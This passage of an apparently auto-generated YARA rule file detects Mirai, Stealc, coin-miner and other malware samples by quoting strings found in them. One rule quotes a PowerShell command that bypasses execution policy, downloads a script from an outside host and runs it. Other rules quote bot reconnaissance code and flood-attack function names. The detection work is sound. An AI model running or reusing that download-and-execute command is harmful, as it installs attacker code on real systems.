      $s1 = "__pthread_mutex_unlock_usercnt" fullword ascii /* score: '21.00'*/
      $s2 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_lock_full" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s6 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s7 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s10 = "update_process" fullword ascii /* score: '15.00'*/
      $s11 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s12 = "hexPayload" fullword ascii /* score: '13.00'*/
      $s13 = "read_encoded_value_with_base" fullword ascii /* score: '12.00'*/
      $s14 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s15 = "read_encoded_value" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule Mirai_signature__bece8d68 {
   meta:
      description = "dropzone - file Mirai(signature)_bece8d68.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "bece8d68425990bdfc1dc6b3d09bc9fe826a78c6e1bc3bd00c48c6124496d338"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s5 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s6 = "__scan_getc" fullword ascii /* score: '10.00'*/
      $s7 = "__scan_ungetc" fullword ascii /* score: '10.00'*/
      $s8 = "scan_getwc" fullword ascii /* score: '10.00'*/
      $s9 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s10 = "__scan_cookie.c" fullword ascii /* score: '8.00'*/
      $s11 = "__init_scan_cookie" fullword ascii /* score: '8.00'*/
      $s12 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__307b1ed6 {
   meta:
      description = "dropzone - file Mirai(signature)_307b1ed6.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "307b1ed60a3de7e51f9bd89128521072882d11e7fbffd04b7232c2bc26124c61"
   strings:
      $s1 = "iknncvvi" fullword ascii /* score: '8.00'*/
      $s2 = "abfefghijklmno" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__81a6645f {
   meta:
      description = "dropzone - file Mirai(signature)_81a6645f.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "81a6645f942191bc2793f956acfc8fa2b80501171f8fc8bb0518ddddb050f649"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s3 = "readlink /proc/self/exe" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Babadeda_signature__5877688b4859ffd051f6be3b8e0cd533_imphash_ {
   meta:
      description = "dropzone - file Babadeda(signature)_5877688b4859ffd051f6be3b8e0cd533(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b119c2e196698a2a7567d8c250325153b532300d889a6cf70a341c059318d4b0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii /* score: '58.00'*/
      $s2 = " or \"requireAdministrator\" --> <v3:requestedExecutionLevel level=\"requireAdministrator\" /> </v3:requestedPrivileges> </v3:se" ascii /* score: '28.00'*/
      $s3 = "2147483648" wide /* score: '17.00'*/ /* hex encoded string '!GH6H' */
      $s4 = "> <dependency> <dependentAssembly> <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0" ascii /* score: '15.00'*/
      $s5 = "v3=\"urn:schemas-microsoft-com:asm.v3\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \"asInvoker\", \"highestAvaila" ascii /* score: '14.00'*/
      $s6 = "Downloads\\" fullword wide /* score: '10.00'*/
      $s7 = " 2_,A755e" fullword ascii /* score: '9.00'*/ /* hex encoded string '*u^' */
      $s8 = "cessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /> </dependentAssembly> </dependency> <v3:trustInfo " ascii /* score: '9.00'*/
      $s9 = "Nndp0CG!" fullword ascii /* score: '9.00'*/
      $s10 = "Denormal floating-point operand" fullword wide /* score: '9.00'*/
      $s11 = "Invalid floating-point operation" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule CoinMiner_signature__a56f115ee5ef2625bd949acaeec66b76_imphash_ {
   meta:
      description = "dropzone - file CoinMiner(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0c5931381976b9c08c5887b457af47b84eeabb3b6e9a2babd8fbcf89d9327300"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "^#/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s7 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s8 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s9 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s10 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s11 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s12 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s13 = "Htox.UNZ" fullword ascii /* score: '10.00'*/
      $s14 = "OspYp`g" fullword ascii /* score: '9.00'*/
      $s15 = "/getwlstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash_ {
   meta:
      description = "dropzone - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "cccc4da331a430d4de3d2054e9c5146ecae8a4d30c997ed46f94228f0f2fe392"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "\\/dumpstatus" fullword ascii /* score: '15.00'*/
      $s5 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s7 = " http://ccsca2021.ocsp-certum.com05" fullword ascii /* score: '10.00'*/
      $s8 = "http://subca.ocsp-certum.com01" fullword ascii /* score: '10.00'*/
      $s9 = "http://subca.ocsp-certum.com02" fullword ascii /* score: '10.00'*/
      $s10 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s11 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s12 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s13 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s14 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s15 = "3,$1,$3,$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule sig_2aa5579969a6f33527eedbcb9bdc5983edb232928f02457a11974f1ac25131bd_2aa55799 {
   meta:
      description = "dropzone - file 2aa5579969a6f33527eedbcb9bdc5983edb232928f02457a11974f1ac25131bd_2aa55799.xlsx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2aa5579969a6f33527eedbcb9bdc5983edb232928f02457a11974f1ac25131bd"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule Ga_gyt_signature__e83a33ff {
   meta:
      description = "dropzone - file Ga-gyt(signature)_e83a33ff.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e83a33ff85a0ac8b794a2c6b739138f5dd998238aec0d00461e1033796c4fb5d"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
      $s2 = "oRaT/d$" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8e433586 {
   meta:
      description = "dropzone - file Mirai(signature)_8e433586.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8e433586de886dc734e0894b9d266803ecccb3b04095a0186e0093826a0d2869"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__28c0c6f2 {
   meta:
      description = "dropzone - file Mirai(signature)_28c0c6f2.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "28c0c6f22376f482b2237f241de64f8a848d0ae4768bc98bf4699f17f68c57ca"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "scan_process_signatures" fullword ascii /* score: '16.00'*/
      $s4 = "is_self_process" fullword ascii /* score: '15.00'*/
      $s5 = "process_locker" fullword ascii /* score: '15.00'*/
      $s6 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s7 = "getoffset" fullword ascii /* score: '13.00'*/
      $s8 = "commands.c" fullword ascii /* score: '12.00'*/
      $s9 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s10 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s11 = "fake_time" fullword ascii /* score: '9.00'*/
      $s12 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
      $s13 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s14 = "getenv.c" fullword ascii /* score: '9.00'*/
      $s15 = "log_killed_pid" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__33489905 {
   meta:
      description = "dropzone - file Mirai(signature)_33489905.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "334899051b2d93c935b393d71d1f238bf2543b48e059564626e9b277702318a5"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "process_locker" fullword ascii /* score: '15.00'*/
      $s4 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s5 = "commands.c" fullword ascii /* score: '12.00'*/
      $s6 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s7 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s8 = "fake_time" fullword ascii /* score: '9.00'*/
      $s9 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s10 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
      $s11 = "exploitscanner_scanner_rawpkt" fullword ascii /* score: '9.00'*/
      $s12 = "exploitscanner_fake_time" fullword ascii /* score: '9.00'*/
      $s13 = "util_encryption" fullword ascii /* score: '9.00'*/
      $s14 = "exploit.c" fullword ascii /* score: '8.00'*/
      $s15 = "cncsock" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__5a0ba275 {
   meta:
      description = "dropzone - file Mirai(signature)_5a0ba275.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5a0ba275171dc66897f22e85cc70aa65dc6538351780d980d95ea3b5a7decb44"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "scan_process_signatures" fullword ascii /* score: '16.00'*/
      $s4 = "is_self_process" fullword ascii /* score: '15.00'*/
      $s5 = "process_locker" fullword ascii /* score: '15.00'*/
      $s6 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s7 = "getoffset" fullword ascii /* score: '13.00'*/
      $s8 = "commands.c" fullword ascii /* score: '12.00'*/
      $s9 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s10 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s11 = "fake_time" fullword ascii /* score: '9.00'*/
      $s12 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s13 = "getenv.c" fullword ascii /* score: '9.00'*/
      $s14 = "log_killed_pid" fullword ascii /* score: '9.00'*/
      $s15 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__71b35d48 {
   meta:
      description = "dropzone - file Mirai(signature)_71b35d48.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "71b35d489400e96742ba71eca91742c5d16b11ab66ce5719f251b2780469724d"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s4 = "commands.c" fullword ascii /* score: '12.00'*/
      $s5 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s6 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s7 = "fake_time" fullword ascii /* score: '9.00'*/
      $s8 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s9 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
      $s10 = "exploitscanner_scanner_rawpkt" fullword ascii /* score: '9.00'*/
      $s11 = "exploitscanner_fake_time" fullword ascii /* score: '9.00'*/
      $s12 = "util_encryption" fullword ascii /* score: '9.00'*/
      $s13 = "exploit.c" fullword ascii /* score: '8.00'*/
      $s14 = "cncsock" fullword ascii /* score: '8.00'*/
      $s15 = "cncsocket" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__dc1c46ab {
   meta:
      description = "dropzone - file Mirai(signature)_dc1c46ab.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "dc1c46abc78807ee50f22a58f75df1b7a7f05d7cdb1d1b4036fba0cc6ec19d25"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "scan_process_signatures" fullword ascii /* score: '16.00'*/
      $s4 = "is_self_process" fullword ascii /* score: '15.00'*/
      $s5 = "process_locker" fullword ascii /* score: '15.00'*/
      $s6 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s7 = "getoffset" fullword ascii /* score: '13.00'*/
      $s8 = "commands.c" fullword ascii /* score: '12.00'*/
      $s9 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s10 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s11 = "fake_time" fullword ascii /* score: '9.00'*/
      $s12 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s13 = "getenv.c" fullword ascii /* score: '9.00'*/
      $s14 = "log_killed_pid" fullword ascii /* score: '9.00'*/
      $s15 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule d94d2263b568e46c50b7229301a92d7fcf4d7591fc5f90a7187d38ace7656360_d94d2263 {
   meta:
      description = "dropzone - file d94d2263b568e46c50b7229301a92d7fcf4d7591fc5f90a7187d38ace7656360_d94d2263.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "d94d2263b568e46c50b7229301a92d7fcf4d7591fc5f90a7187d38ace7656360"
   strings:
      $s1 = "TLOGINDIALOG" fullword wide /* score: '17.50'*/
      $s2 = "TPASSWORDDIALOG" fullword wide /* score: '14.50'*/
      $s3 = "<!--The ID below indicates app support for Windows 10 -->" fullword ascii /* score: '12.00'*/
      $s4 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s6 = "com.sunisoft.incupdate.update" fullword wide /* score: '10.00'*/
      $s7 = "Update.URS" fullword wide /* score: '10.00'*/
      $s8 = "DBINSERT" fullword wide /* score: '9.50'*/
      $s9 = "TPROXYFORM" fullword wide /* score: '9.50'*/
      $s10 = ">6\\2{*/{" fullword ascii /* score: '9.00'*/ /* hex encoded string 'b' */
      $s11 = "nmnhirm" fullword ascii /* score: '8.00'*/
      $s12 = "h$%d%D4" fullword ascii /* score: '8.00'*/
      $s13 = "qpbbblp" fullword ascii /* score: '8.00'*/
      $s14 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule Mirai_signature__6062bebb {
   meta:
      description = "dropzone - file Mirai(signature)_6062bebb.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6062bebbe9971ed7f8c348745b3808d40bee0356406acb3242a9d326b3404704"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__74ec75a2 {
   meta:
      description = "dropzone - file Mirai(signature)_74ec75a2.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "74ec75a21b2332488159d790d7681ed346e3cf3dd7377508acf91530f89546e4"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__216b5870 {
   meta:
      description = "dropzone - file Mirai(signature)_216b5870.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "216b587035143c7e370c3017a72132b32638157b2751d7e0efd8d5b8b1e90a94"
   strings:
      $s1 = "__stdio_mutex_initializer.3991" fullword ascii /* score: '15.00'*/
      $s2 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s3 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
      $s4 = "__get_pc_thunk_bx" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__3508b667 {
   meta:
      description = "dropzone - file Mirai(signature)_3508b667.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3508b6675ca30ad3623a338a59e90b4305049aa36e13f5e05a5c89f9603bec5c"
   strings:
      $s1 = "__stdio_mutex_initializer.4160" fullword ascii /* score: '15.00'*/
      $s2 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s3 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
      $s4 = "__get_pc_thunk_bx" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__4702ad6e {
   meta:
      description = "dropzone - file Mirai(signature)_4702ad6e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4702ad6ee46635683cbe2fe03a8bdb1fa2a7201207584875b6b21f3ed8544ff9"
   strings:
      $s1 = "__stdio_mutex_initializer.4280" fullword ascii /* score: '15.00'*/
      $s2 = "getrlimit64" fullword ascii /* score: '10.00'*/
      $s3 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s4 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__4559157e {
   meta:
      description = "dropzone - file Mirai(signature)_4559157e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4559157eed34eef90ff6dce94c5caf1f3b8caaffea1178e8aa5072d10af03acb"
   strings:
      $s1 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__ec584662 {
   meta:
      description = "dropzone - file Mirai(signature)_ec584662.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ec584662b57765804c48e3f19f66ff46d1f0e7095437556370bcb0e5d3463965"
   strings:
      $s1 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__f8272968 {
   meta:
      description = "dropzone - file Mirai(signature)_f8272968.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f8272968f43c464323883ad39abbddcf21b94ec8f286556c02c964c707ffdcb3"
   strings:
      $s1 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule sig_57f32f47a1737339c800cf48b68bc562029b6faeb7bb8129d47c9ec2b77b44f7_57f32f47 {
   meta:
      description = "dropzone - file 57f32f47a1737339c800cf48b68bc562029b6faeb7bb8129d47c9ec2b77b44f7_57f32f47.bat"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "57f32f47a1737339c800cf48b68bc562029b6faeb7bb8129d47c9ec2b77b44f7"
   strings:
      $x1 = "powershell -ExecutionPolicy Bypass -WindowStyle Normal -Command \"Invoke-WebRequest -Uri 'https://neoesdras.ddns.net:443/Core.ps" ascii /* score: '51.00'*/
      $x2 = "powershell -ExecutionPolicy Bypass -WindowStyle Normal -Command \"Invoke-WebRequest -Uri 'https://neoesdras.ddns.net:443/Core.ps" ascii /* score: '51.00'*/
      $s3 = "' -UseBasicParsing | Invoke-Expression\"" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b_58d54e24 {
   meta:
      description = "dropzone - file 58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b_58d54e24.unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b"
   strings:
      $x1 = "Kernel32.GetComputerNameExW(ComputerNameDnsHostname, botinfo_addr + BOT_INFO.pcname.offset, addressof(mp));" fullword ascii /* score: '32.00'*/
      $s2 = "    Kernel32.CreateProcessW(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", args, 0, 0, 0, 0, 0, 0" ascii /* score: '30.00'*/
      $s3 = "    Kernel32.CreateProcessW(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", args, 0, 0, 0, 0, 0, 0" ascii /* score: '30.00'*/
      $s4 = "        tPath = \"C:\\\\Windows\\\\System32\\\\cmd.exe\";" fullword ascii /* score: '29.00'*/
      $s5 = "Kernel32.GetComputerNameExW(ComputerNameDnsDomain, botinfo_addr + BOT_INFO.domainname.offset, addressof(mp));" fullword ascii /* score: '27.00'*/
      $s6 = "            procpath = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\";" fullword ascii /* score: '25.00'*/
      $s7 = "Kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED | ES_DISPLAY_REQUIRED);" fullword ascii /* score: '24.00'*/
      $s8 = "    if Advapi32.OpenProcessToken(Kernel32.GetCurrentProcess(), TOKEN_QUERY, addressof(hToken)):" fullword ascii /* score: '23.00'*/
      $s9 = "Advapi32.GetUserNameW(botinfo_addr + BOT_INFO.username.offset, addressof(mp));" fullword ascii /* score: '22.00'*/
      $s10 = "        Advapi32.GetTokenInformation(hToken, TokenElevation, addressof(IsElevated), sizeof(IsElevated), addressof(cbSize))" fullword ascii /* score: '22.00'*/
      $s11 = "        tPath = \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\";" fullword ascii /* score: '22.00'*/
      $s12 = "TokenElevation = 20;" fullword ascii /* score: '19.00'*/
      $s13 = "User32 = WinDLL(\"User32.dll\");" fullword ascii /* score: '19.00'*/
      $s14 = "botinfo.iselevated = CheckElevation();" fullword ascii /* score: '19.00'*/
      $s15 = "Winhttp = WinDLL(\"Winhttp.dll\");" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x7266 and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule sig_94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a_94dc0f69 {
   meta:
      description = "dropzone - file 94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a_94dc0f69.unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a"
   strings:
      $x1 = "Kernel32.GetComputerNameExW(ComputerNameDnsHostname, botinfo_addr + BOT_INFO.pcname.offset, addressof(mp));" fullword ascii /* score: '32.00'*/
      $s2 = "    Kernel32.CreateProcessW(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", args, 0, 0, 0, 0, 0, 0" ascii /* score: '30.00'*/
      $s3 = "    Kernel32.CreateProcessW(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", args, 0, 0, 0, 0, 0, 0" ascii /* score: '30.00'*/
      $s4 = "        tPath = \"C:\\\\Windows\\\\System32\\\\cmd.exe\";" fullword ascii /* score: '29.00'*/
      $s5 = "Kernel32.GetComputerNameExW(ComputerNameDnsDomain, botinfo_addr + BOT_INFO.domainname.offset, addressof(mp));" fullword ascii /* score: '27.00'*/
      $s6 = "            procpath = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\";" fullword ascii /* score: '25.00'*/
      $s7 = "Kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED | ES_DISPLAY_REQUIRED);" fullword ascii /* score: '24.00'*/
      $s8 = "    if Advapi32.OpenProcessToken(Kernel32.GetCurrentProcess(), TOKEN_QUERY, addressof(hToken)):" fullword ascii /* score: '23.00'*/
      $s9 = "Advapi32.GetUserNameW(botinfo_addr + BOT_INFO.username.offset, addressof(mp));" fullword ascii /* score: '22.00'*/
